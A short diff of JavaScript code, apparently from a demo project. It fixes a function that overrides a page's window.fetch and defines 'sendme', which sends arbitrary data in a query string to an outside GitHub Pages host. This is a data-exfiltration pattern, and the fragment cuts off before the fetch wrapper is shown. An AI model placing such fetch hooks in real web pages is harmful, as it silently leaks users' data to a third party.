@@ -644,8 +644,8 @@ function interceptFetch( window )
     let oldFetch = window.fetch;
     window.oldFetch = oldFetch;
     window.sendme = function( data )  {
-       window.oldFetch( { url.url : 'https://jfseb.github.io/demohtml/somescript.js?data=' + encodeURIComponent( data ), 
-                         url.method : 'GET' } );
+       window.oldFetch( { url : 'https://jfseb.github.io/demohtml/somescript.js?data=' + encodeURIComponent( data ), 
+                         method : 'GET' } );
     }
     window.fetch = function( url, data )
     {
